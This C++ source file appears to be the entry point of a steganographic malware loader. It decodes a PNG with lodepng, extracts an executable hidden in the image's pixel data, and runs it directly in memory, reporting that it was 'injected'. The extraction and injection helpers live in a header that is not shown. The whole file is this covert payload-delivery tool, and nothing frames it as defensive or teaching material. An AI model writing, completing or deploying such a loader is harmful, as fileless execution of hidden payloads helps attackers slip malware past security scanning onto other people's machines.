#include "main.h"
#include <iostream>
#include <vector>

int main(int argc, char* argv[]) {
    if (argc != 2) {
        std::cerr << "Usage: " << argv[0] << " <encoded_image.png>\n";
        return 1;
    }

    std::string encodedImage = argv[1];

    std::vector<unsigned char> image;
    unsigned width, height;

    // Decode PNG
    unsigned error = lodepng::decode(image, width, height, encodedImage);
    if (error) {
        std::cerr << "[!] PNG decode error " << error << ": " << lodepng_error_text(error) << "\n";
        return 1;
    }

    uint32_t bitLength = extractLengthFromImage(image);
    if (bitLength + 32 > image.size()) {
        std::cerr << "Bit length too large, possibly corrupted.\n";
        return 1;
    }

    auto data = extractFileDataFromImage(image, bitLength);

    if (!runExecutableInMemory(data)) {
        std::cerr << "Failed to run executable.\n";
        return 1;
    }

    std::cout << "Executable injected and running in memory.\n";
    return 0;
}
